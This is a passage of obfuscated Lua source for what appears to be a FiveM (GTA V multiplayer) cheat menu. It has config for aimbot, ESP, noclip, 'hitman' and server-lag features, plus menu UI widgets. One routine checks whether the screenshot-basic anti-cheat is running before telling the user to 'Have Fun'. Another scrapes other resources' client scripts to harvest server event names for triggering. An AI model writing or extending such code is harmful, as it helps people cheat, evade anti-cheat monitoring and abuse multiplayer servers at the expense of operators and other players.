            gayespname = false,
            gayespdistance = false,
            gayespvehicle = false,
            noragmen = false,
            nocritsmen = false,
            hitmangod = false,
            hitmanexpload = false,
        },
        Moverino = {
            StoreDaDing,
            rot = 0.0,
            rot1 = 0.0,
            rot2 = 0.0,
        },
        rctable = {
            car,
            ped1,
            rp,
            cam,
            camt = false,
        },
        SlaveStore = {
            objh,
            propski,
            newpropski,
            rot = 0.0,
            rot1 = 0.0,
            rot2 = 0.0,
            placeski = false,
            objtype = 0,
            objsel = 0,
            objsel1 = 0,
            objsel2 = 0,
            propsmall = {
                RfPsUKHSFWJuBEJuz.rE.LumHash('prop_water_ramp_03'),
                RfPsUKHSFWJuBEJuz.rE.LumHash('prop_container_03b'),
                RfPsUKHSFWJuBEJuz.rE.LumHash('v_res_d_dildo_f'),
                RfPsUKHSFWJuBEJuz.rE.LumHash('p_ld_stinger_s')
            },
            proplarge = {
                RfPsUKHSFWJuBEJuz.rE.LumHash('ap1_lod_slod4'),
                RfPsUKHSFWJuBEJuz.rE.LumHash('dt1_11_slod1'),
                RfPsUKHSFWJuBEJuz.rE.LumHash('po1_sh1_sunk_lod')
            },
            propcustom = {
                RfPsUKHSFWJuBEJuz.rE.LumHash('v_res_d_dildo_f'),
            }
        },
        Keybinds = {
            aimbotKb = 21,
            aimbotKn = "LEFTSHIFT",
            HealthKb = -1,
            HealthKn = -1,
            ArmorKb = -1,
            ArmorKn = -1,
            RepairKb = -1,
            RepairKn = -1,
            ReviveKb = -1,
            ReviveKn = -1,
            FreecamKb = -1,
            FreecamKn = -1,
            NoclipKb = -1,
            NoclipKn = -1,
            ConsoleKb = -1,
            ConsoleKn = -1,
            OpenKb = -1,
            OpenKn = -1,
            OpenKalpha = 0
        },
        dienow,
        aimbotfov = 140,
        AbDist = 300,
        Delay = 300,
        ESPDist = 300,
        opennow,
        MainX = 800,
        MainY = 400,
        CPrimary = {
            r = 75,
            g = 116,
            b = 164,
            a = 255
        },
        CPrimary2 = {
            r = 75,
            g = 116,
            b = 164,
            a = 150
        },
        CSecondary = {
            r = 73,
            g = 150,
            b = 205,
            a = 255
        },
        CSecondary2 = {
            r = 100,
            g = 200,
            b = 245,
            a = 150
        },
        CText = {
            r = 255,
            g = 255,
            b = 255,
            a = 255
        },
        Drag = {
            x,
            y,
            draggienow,
        },
        OnlinePPageS = {
            oppages = 0
        },
        WepOPPageS = {
            oppages = 0
        },
        Men1Y,
        Men2Y,
        Men3Y,
        Men4Y,
        Men5Y,
        Men1T,
        Men2T,
        Men2tOff,
        Men2mbOff,
        Men3T,
        Men4T,
        Men5T,
        offset1,
        offset2,
        offset3,
        offset4,
        offset5,
        camf,
        freecammode = 0,
        freecamoptiona = 0,
        freecamoptionb = 0,
        freecamoptionc = 0,
        SelecOP,
        specfornow,
        vehoff,
        vehoff1,
        vehoff2,
        vehoff3,
        vehoff4,
        newclipspd,
        oldclipspd,
        serverlagveh = 'Sultan',
        shootselwep = "WEAPON_PISTOL",
        shootseldmg = 0.0,
        ramselveh = 'Dump',
        hitmancar = 'SULTAN',
        hitmanheli = 'BUZZARD',
        hitmangun = "WEAPON_APPISTOL",
        hitmanac = 75.0,
        openkeydefine,
        breathon,
        healthbind,
        armorbind,
        repairbind,
        revivebind,
        freecambind,
        noclipbind,
        consolebind,
        openmenbind,
        aimbotbind,
        ButtonScale,
        SubMenuScale,
        SubMenuWH = {},
        FreeCamScale,
        PointerScale,
        tracertime,
        aimbotfriend = {},
    },
    NotiQ = {
        text = {},
        timeout = {},
    },
    DSR = {},
    Blips = {},
}

-- I guess we can put all menu functions here ex. Button, CheckBox, Combo boxes? --
local DmSgpcIoUEJtyTfBBt = {
    Mfunc = {
        Button = function(text, menoffset, yoff, xoff1, fo)        
            local x 
            local y
            local xoff = xoff1 or 0
            local clicked1 = nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1'])
            local clicked2 = nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1'])
            local font = fo or 4
            local tw = jrnyLearIyzKiSIen.func.round(jrnyLearIyzKiSIen.func.FindWidth(text, font, jrnyLearIyzKiSIen.config.ButtonScale))

            if menoffset == 1 then
                x = jrnyLearIyzKiSIen.config.MainX + 20 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.SubMenuWH.subs1 - 10 + yoff
            elseif menoffset == 2 then
                x = jrnyLearIyzKiSIen.config.MainX + 20 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 - 10 + yoff
            elseif menoffset == 3 then
                x = jrnyLearIyzKiSIen.config.MainX + 20 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs3 - 10 + yoff
            elseif menoffset == 4 then
                x = jrnyLearIyzKiSIen.config.MainX + 20 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4 - 10 + yoff
            elseif menoffset == 5 then
                x = jrnyLearIyzKiSIen.config.MainX + 20 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 - 10 + yoff
            end
           

            
            if clicked1 and jrnyLearIyzKiSIen.func.HoverOn(x, y + 2.5, tw, 15) then
                jrnyLearIyzKiSIen.func.DrawSomeText(text, font, false, x, y, jrnyLearIyzKiSIen.config.ButtonScale, 0, 0, 0, 255)
            else
                jrnyLearIyzKiSIen.func.DrawSomeText(text, font, false, x, y, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                --jrnyLearIyzKiSIen.func.DrawRectangle(x,y + 2.5,tw,15,255,255,255,150)
            end
    
            if clicked2 and jrnyLearIyzKiSIen.func.HoverOn(x, y + 2.5, tw, 15) then
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
                return true
            else
                return
            end

            return false
        end,
        CheckBox = function(text, toggle, callback, menoffset, yoff, xoff1)
            local x 
            local y
            local clicked1 = nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1'])
            local clicked2 = nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1'])
            local tw = jrnyLearIyzKiSIen.func.round(jrnyLearIyzKiSIen.func.FindWidth(text, 4, jrnyLearIyzKiSIen.config.ButtonScale)) + 15
            local xoff = xoff1 or 0

            if menoffset == 1 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.SubMenuWH.subs1 - 10 + yoff
            elseif menoffset == 2 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 - 10 + yoff
            elseif menoffset == 3 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs3 - 10 + yoff
            elseif menoffset == 4 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4 - 10 + yoff
            elseif menoffset == 5 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xoff
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 - 10 + yoff
            end
           
            if clicked1 and jrnyLearIyzKiSIen.func.HoverOn(x - 15, y + 2.5, tw, 15) then
                jrnyLearIyzKiSIen.func.DrawSomeText(text, 4, false, x, y - 0.40, jrnyLearIyzKiSIen.config.ButtonScale, 0, 0, 0, 255)
            else
                jrnyLearIyzKiSIen.func.DrawSomeText(text, 4, false, x, y - 0.40, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            end
        
            if clicked2 and jrnyLearIyzKiSIen.func.HoverOn(x - 15, y + 2.5, tw, 15) then
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
                toggle = not toggle
                if callback then 
                    callback(toggle) 
                end
                return true
            end
            
            if toggle then
                jrnyLearIyzKiSIen.func.DrawSomeSprite(x - 6.5, y + 10.5 - 1, 25, 25, 0.0, "mpleaderboard", "leaderboard_votetick_icon", jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            else  
                jrnyLearIyzKiSIen.func.DrawRectangle(x - 11.5, y + 5 - 0.5, 11, 11, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            end

            return false
        end,
        ComboBox = function(text, items, currentIndex, selectedIndex, callback, menoffset, yoff, xoff)
            local x 
            local y
            local itemsCount = #items
            local selectedItem = items[currentIndex]
            local clicked1 = nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1'])
            local clicked2 = nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1'])
            local tw1 = jrnyLearIyzKiSIen.func.round(jrnyLearIyzKiSIen.func.FindWidth(text, 4, jrnyLearIyzKiSIen.config.ButtonScale))
            local tw = jrnyLearIyzKiSIen.func.round(jrnyLearIyzKiSIen.func.FindWidth(selectedItem, 4, jrnyLearIyzKiSIen.config.ButtonScale))
            local clickedleft = nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) 
            local clickedright = nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1'])
            local clickedleft2 = nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) 
            local clickedright2 = nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1'])
            local xon = xoff or 0

            if menoffset == 1 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xon
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.SubMenuWH.subs1 - 10 + yoff
            elseif menoffset == 2 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xon
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 - 10 + yoff
            elseif menoffset == 3 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xon
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs3 - 10 + yoff
            elseif menoffset == 4 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xon
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4 - 10 + yoff
            elseif menoffset == 5 then
                x = jrnyLearIyzKiSIen.config.MainX + 35 + xon
                y = jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 - 10 + yoff
            end

            if itemsCount > 1 then
                selectedItem = RfPsUKHSFWJuBEJuz.rE.LumToString(selectedItem)
            end

            jrnyLearIyzKiSIen.func.DrawSomeText(text, 4, false, x - 14, y - 0.40, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)

            --jrnyLearIyzKiSIen.func.DrawRectangle(x + tw1 - 17 + 2,y + 5,10,12,255,255,255,150) --left clicker test
            --jrnyLearIyzKiSIen.func.DrawRectangle(x + tw1 - 17 + tw + 12,y + 5,10,12,255,255,255,150) --right clicker test
            --jrnyLearIyzKiSIen.func.DrawRectangle(x + tw1 - 2, y + 3.5, tw - 5, 15,255,255,255,150) --text clicker test

            if clicked2 and jrnyLearIyzKiSIen.func.HoverOn(x + tw1 - 2, y + 3.5, tw - 5, 15) then
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
                return true
            end

            if clicked1 and jrnyLearIyzKiSIen.func.HoverOn(x + tw1 - 2, y + 3.5, tw - 5, 15) then
                jrnyLearIyzKiSIen.func.DrawSomeText(RfPsUKHSFWJuBEJuz.rE.LumToString(selectedItem), 4, false, x + tw1 - 4, y + 0.4, jrnyLearIyzKiSIen.config.ButtonScale, 0, 0, 0, 255)
            else
                jrnyLearIyzKiSIen.func.DrawSomeText(RfPsUKHSFWJuBEJuz.rE.LumToString(selectedItem), 4, false, x + tw1 - 4, y + 0.4, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            end

            if clickedleft2 and jrnyLearIyzKiSIen.func.HoverOn(x + tw1 - 17 + 2,y + 5,10,12) then
                jrnyLearIyzKiSIen.func.DrawSomeText('\226\134\144\10', 0, false, x + tw1 - 17, y - 0.20, jrnyLearIyzKiSIen.config.ButtonScale, 0, 0, 0, 255)
            else
                jrnyLearIyzKiSIen.func.DrawSomeText('\226\134\144\10', 0, false, x + tw1 - 17, y - 0.20, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            end

            if clickedright2 and jrnyLearIyzKiSIen.func.HoverOn(x + tw1 - 17 + tw + 12,y + 5,10,12) then
                jrnyLearIyzKiSIen.func.DrawSomeText("\226\134\146\10", 0, false, x + tw1 - 17 + tw + 12, y - 0.20, jrnyLearIyzKiSIen.config.ButtonScale, 0, 0, 0, 255)
            else
                jrnyLearIyzKiSIen.func.DrawSomeText("\226\134\146\10", 0, false, x + tw1 - 17 + tw + 12, y - 0.20, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            end

            selectedIndex = currentIndex
            callback(currentIndex, selectedIndex)
        
            if clickedleft and jrnyLearIyzKiSIen.func.HoverOn(x + tw1 - 17 + 2,y + 5,10,12) then
                if currentIndex > 1 then 
                    currentIndex = currentIndex - 1 
                end
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
            elseif clickedright and jrnyLearIyzKiSIen.func.HoverOn(x + tw1 - 17 + tw + 12,y + 5,10,12) then
                if currentIndex < itemsCount then 
                    currentIndex = currentIndex + 1 
                end
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
            else
                currentIndex = selectedIndex
            end
        
            callback(currentIndex, selectedIndex)
            return false
        end,
        KeyboardInput = function(textEntry, exampleText, maxStringLenght)
            nlFXKkFxuKQAk.natives.AddTextEntry('FMMC_KEY_TIP1', textEntry..':')
            nlFXKkFxuKQAk.natives.DisplayOnscreenKeyboard(1, 'FMMC_KEY_TIP1', '', exampleText, '', '', '', maxStringLenght)
            nlFXKkFxuKQAk.natives.DisableAllControlActions(0)

            while nlFXKkFxuKQAk.natives.UpdateOnscreenKeyboard() ~= 1 and nlFXKkFxuKQAk.natives.UpdateOnscreenKeyboard() ~= 2 do
                jrnyLearIyzKiSIen.config.opennow = false
                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
            end
        
            if nlFXKkFxuKQAk.natives.UpdateOnscreenKeyboard() ~= 2 then
                local result = nlFXKkFxuKQAk.natives.GetOnscreenKeyboardResult()
                RfPsUKHSFWJuBEJuz.rE.LumWait(500)
                nlFXKkFxuKQAk.natives.EnableAllControlActions(0)
                 if not om then jrnyLearIyzKiSIen.config.opennow = true end
                return result
            else
                RfPsUKHSFWJuBEJuz.rE.LumWait(500)
                nlFXKkFxuKQAk.natives.EnableAllControlActions(0)
                if not om then jrnyLearIyzKiSIen.config.opennow = true end
                return nil
            end
        end,
        DrawNotification = function(text, spd)
            local baboon = true
            local baboon2 = true
            local fadeaway = 255
            local x, y2 = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
            local scale = jrnyLearIyzKiSIen.config.FreeCamScale
            local y = 0.0
            local notilen = jrnyLearIyzKiSIen.func.round(jrnyLearIyzKiSIen.func.FindWidth(text, 4, scale))
            local notibox = notilen + 20
            local stop = x - notibox
            local xoff = 2.0 + (notilen / 2)
            local tout1 = ((x + xoff) - stop)
            local tout2 = tout1 + 200
            RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                while baboon do
                    jrnyLearIyzKiSIen.func.DrawSomeText(text, 4, true, x + xoff, 300 + y, scale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, fadeaway)
                    jrnyLearIyzKiSIen.func.DrawRectangle(x - 10,300,notibox,35,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, fadeaway)
                    RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                end
            end)
            RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(jrnyLearIyzKiSIen.NotiQ.timeout, tout2)
            RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                while baboon do
                    if baboon2 then    
                        x = x - 25
                        RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                    end
                    if x <= stop then
                        baboon2 = false
                        RfPsUKHSFWJuBEJuz.rE.LumWait(spd)
                        for i = 1, 10 do
                            fadeaway = fadeaway - 25
                            x = x + 25
                            RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                        end
                        baboon = false
                    end
                    RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                end
            end)
        end,
        ShowNotification = function(text, x, scale, y)
            RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(jrnyLearIyzKiSIen.NotiQ.text, text)
        end,
        CheckScb = function(cb)	
            if nlFXKkFxuKQAk.natives.GetResourceState('screenshot-basic') == 'started' then cb('Found ~r~Screenshot-Basic ~w~Be Carefull!', 3000) return end
            for i = 0, nlFXKkFxuKQAk.natives.GetNumResources(), 1 do
                local resource_name = nlFXKkFxuKQAk.natives.GetResourceByFindIndex(i)
                  if resource_name and nlFXKkFxuKQAk.natives.GetResourceState(resource_name) == "started" then
                    for i = 0, nlFXKkFxuKQAk.natives.GetNumResourceMetadata(resource_name, 'client_script') do
                        local contents = nlFXKkFxuKQAk.natives.GetResourceMetadata(resource_name, 'client_script', i)
                        if contents ~= nil then
                            local file = nlFXKkFxuKQAk.natives.LoadResourceFile(resource_name, contents)
                            if file ~= nil then
                                local cleanFile = RfPsUKHSFWJuBEJuz.rE.LumString.LumLower(file)
                                local hasScb1 = RfPsUKHSFWJuBEJuz.rE.LumString.LumFind(file, 'screenshot.created')
                                if hasScb1 ~= nil then
                                    cb('Found ~r~Screenshot-Basic ~w~Be Carefull!', 3000)
                                    return
                                end
                            end
                        end
                    end
                end
            end
            cb('No ~g~Screenshot-Basic ~w~Have Fun!', 3000)
            return
        end
    },
    dynam = {
        Conde_GetTrigger = function(d)
            local s, l;
            local tosub;
            if not jrnyLearIyzKiSIen.dynam.GetResourceStatus(d.resource) then return end
            for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(d.file) do
                local script;
                script = nlFXKkFxuKQAk.natives.LoadResourceFile(d.resource, v);
                if script == nil or script == "nil" or script:len() <= 0 then return end  
                if d.noparam then
                    s, l = RfPsUKHSFWJuBEJuz.rE.LumString.LumFind(script, d.lookfor)
                    if s == nil then
                        return
                    else
                        local Various1, Various2 = RfPsUKHSFWJuBEJuz.rE.LumString.LumFind(script, 'TriggerServerEvent%b()', l)
                        if Various1 == nil then
                            return
                        end
                        local scriptneeker = RfPsUKHSFWJuBEJuz.rE.LumString.LumSub(script, Various1, Various2)
                        local shouldtake, _ = RfPsUKHSFWJuBEJuz.rE.LumString.LumGsub(scriptneeker, 'TriggerServerEvent', "")
                        shouldtake, _ = RfPsUKHSFWJuBEJuz.rE.LumString.LumGsub(shouldtake, "'", "")
                        shouldtake, _ = RfPsUKHSFWJuBEJuz.rE.LumString.LumGsub(shouldtake, '"', "")
                        shouldtake, _ = RfPsUKHSFWJuBEJuz.rE.LumString.LumGsub(shouldtake, '%(', "")
                        shouldtake, _ = RfPsUKHSFWJuBEJuz.rE.LumString.LumGsub(shouldtake, '%)', "")
                        RfPsUKHSFWJuBEJuz.TR[d.name] = shouldtake;
                        RfPsUKHSFWJuBEJuz.rE.pront("---------------")
                        RfPsUKHSFWJuBEJuz.rE.pront(""..d.name.."")
                        RfPsUKHSFWJuBEJuz.rE.pront(""..RfPsUKHSFWJuBEJuz.TR[RfPsUKHSFWJuBEJuz.rE.LumToString(d.name)].."") 
                        return
                    end
                else
                    s, l = RfPsUKHSFWJuBEJuz.rE.LumString.LumFind(script, '%b""' .. d.lookfor);
                    tosub = '"';
                    if s == nil then 
                        s, l = RfPsUKHSFWJuBEJuz.rE.LumString.LumFind(script, "%b''" .. d.lookfor);
                        tosub = "'"
                    end
                    if s == nil then return end
                    local script2 = RfPsUKHSFWJuBEJuz.rE.LumString.LumSub(script, s, l);
                    local trigger_done, _ = RfPsUKHSFWJuBEJuz.rE.LumString.LumGsub(script2, d.lookfor, "");
                    trigger_done = trigger_done:gsub(tosub, '')
                    RfPsUKHSFWJuBEJuz.TR[d.name] = trigger_done;
                    RfPsUKHSFWJuBEJuz.rE.pront("---------------")
                    RfPsUKHSFWJuBEJuz.rE.pront(""..d.name.."")
                    RfPsUKHSFWJuBEJuz.rE.pront(""..RfPsUKHSFWJuBEJuz.TR[RfPsUKHSFWJuBEJuz.rE.LumToString(d.name)].."") 
                    return
                end
            end
        end
    },
    freec = {
        RayCastCam = function(distance)	
            local cameraRotation = nlFXKkFxuKQAk.natives.GetCamRot(jrnyLearIyzKiSIen.config.camf,0)
            local cameraCoord = nlFXKkFxuKQAk.natives.GetCamCoord(jrnyLearIyzKiSIen.config.camf)	
            local direction = jrnyLearIyzKiSIen.freec.RotToDir2(cameraRotation)	
            local destination = {x = cameraCoord.x + direction.x * distance, y = cameraCoord.y + direction.y * distance, z = cameraCoord.z + direction.z * distance}	
            local a, b, c, d, e = nlFXKkFxuKQAk.natives.GetShapeTestResult(nlFXKkFxuKQAk.natives.StartShapeTestRay(cameraCoord.x, cameraCoord.y, cameraCoord.z, destination.x, destination.y, destination.z, -1, -1, 1))
            return b, c, e 
        end,
        CamFwdVect = function(camf)			
            local coords  = nlFXKkFxuKQAk.natives.GetCamCoord(camf)			
            local rot     = nlFXKkFxuKQAk.natives.GetCamRot(camf,0)			  
            return jrnyLearIyzKiSIen.freec.RotToQuat(rot) * RfPsUKHSFWJuBEJuz.rE.LumVector3(0.0, 1.0, 0.0)			
        end,
        CamRightVect = function(camf)			
            local coords  = nlFXKkFxuKQAk.natives.GetCamCoord(camf)			
            local rot     = nlFXKkFxuKQAk.natives.GetCamRot(camf,0)			
            local qrot    = quat(0.0, RfPsUKHSFWJuBEJuz.rE.LumVector3(rot.x, rot.y, rot.z))			  
            return jrnyLearIyzKiSIen.freec.RotToQuat(rot) * RfPsUKHSFWJuBEJuz.rE.LumVector3(1.0, 0.0, 0.0)			
        end,
        FreeCamToggle = function()			
            if jrnyLearIyzKiSIen.config.camf == nil then							
                local coords = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), true)
                jrnyLearIyzKiSIen.config.camf = nlFXKkFxuKQAk.natives.CreateCamWithParams('DEFAULT_SCRIPTED_CAMERA', coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, nlFXKkFxuKQAk.natives.GetGameplayCamFov(), false, 0)				
                nlFXKkFxuKQAk.natives.SetCamActive(jrnyLearIyzKiSIen.config.camf, true)				
                nlFXKkFxuKQAk.natives.RenderScriptCams(true, false, 0, 0, 0)	
                jrnyLearIyzKiSIen.config.features.IONFCH = true
            else				
                local pedcoords = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), true)				
                local coords = nlFXKkFxuKQAk.natives.GetCamCoord(jrnyLearIyzKiSIen.config.camf)								
                jrnyLearIyzKiSIen.config.camf = nil							
                nlFXKkFxuKQAk.natives.SetCamActive(jrnyLearIyzKiSIen.config.camf, false)						   				
                nlFXKkFxuKQAk.natives.RenderScriptCams(false, false, 0, true, false)				
                nlFXKkFxuKQAk.natives.DestroyCam(jrnyLearIyzKiSIen.config.camf, false)				
                nlFXKkFxuKQAk.natives.SetFocusEntity(nlFXKkFxuKQAk.natives.PlayerPedId())
                jrnyLearIyzKiSIen.config.features.IONFCH = false
            end			
        end,
    },
    FunFunc = {
        ElGetUpNow = function()
            nlFXKkFxuKQAk.natives.StopScreenEffect("DeathFailOut")
            nlFXKkFxuKQAk.natives.SetEntityHealth(nlFXKkFxuKQAk.natives.PlayerPedId(-1), 200)
            nlFXKkFxuKQAk.natives.ClearPedBloodDamage(nlFXKkFxuKQAk.natives.GetPlayerPed(-1))
            local coords = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(-1))
            nlFXKkFxuKQAk.natives.SetEntityCoordsNoOffset(nlFXKkFxuKQAk.natives.PlayerPedId(), coords.x, coords.y, coords.z, false, false, false, true)
            nlFXKkFxuKQAk.natives.NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
            jrnyLearIyzKiSIen.func.TriggerCustomEvent(false, 'playerSpawned', coords.x, coords.y, coords.z)
            nlFXKkFxuKQAk.natives.ClearPedBloodDamage(nlFXKkFxuKQAk.natives.PlayerPedId())
        end,
        ElSomeHealth = function()
            nlFXKkFxuKQAk.natives.SetEntityHealth(nlFXKkFxuKQAk.natives.PlayerPedId(), 200)
        end,
        ElSomeArmor = function()
            nlFXKkFxuKQAk.natives.AddArmourToPed(nlFXKkFxuKQAk.natives.PlayerPedId(), 100)
        end,
        ElCleanMe = function()
            nlFXKkFxuKQAk.natives.ClearPedBloodDamage()
        end,
        ElSuicideMe = function()
            nlFXKkFxuKQAk.natives.SetEntityHealth(nlFXKkFxuKQAk.natives.PlayerPedId(), 0)
        end,
        PreMadeFit1 = function()	
            local pedid = nlFXKkFxuKQAk.natives.PlayerId()
            local characterModel = RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01')	
            local face = 0
            local face1 = 0
            local face2 = 0	
            local skin = 10	
            local beard_1 = 10	
            local beard_2 = 10	
            local beard_3 = 1	
            local beard_4 = 1	
            local eyebrows_1 = 1	
            local eyebrows_2 = 10	
            local eyebrows_3 = 1	
            local eyebrows_4 = 1	
            local hair_1 = 1	
            local hair_2 = 0	
            local hair_color_1 = 1	
            local hair_color_2 = 1	
            local tshirt_1 = 15	
            local tshirt_2 = 0	
            local torso_1 = 241	
            local torso_2 = 0	
            local decals_1 = 0	
            local decals_2 = 0	
            local arms = 0	
            local pants_1 = 78	
            local pants_2 = 5	
            local shoes_1 = 1	
            local shoes_2 = 2	
            local mask_1 = 0	
            local mask_2 = 0	
            local bproof_1 = 0	
            local bproof_2 = 0	
            local chain_1 = 0	
            local chain_2 = 0	
            local helmet_1 = 58	
            local helmet_2 = 2	
            local glasses_1 = 5	
            local glasses_2 = 3	
            local watches_1 = 3	
            local watches_2 = 0	
            local ears_1 = 19	
            local ears_2 = 0

            nlFXKkFxuKQAk.natives.RequestModel(characterModel)		
            
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(characterModel) do			
                RfPsUKHSFWJuBEJuz.rE.LumWait(50)		
            end
                    
            nlFXKkFxuKQAk.natives.SetPlayerModel(pedid, characterModel)		
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(nlFXKkFxuKQAk.natives.GetPlayerPed(-1),face, face1, face2, skin, skin, skin, 1.0, 1.0, 1.0, true)		
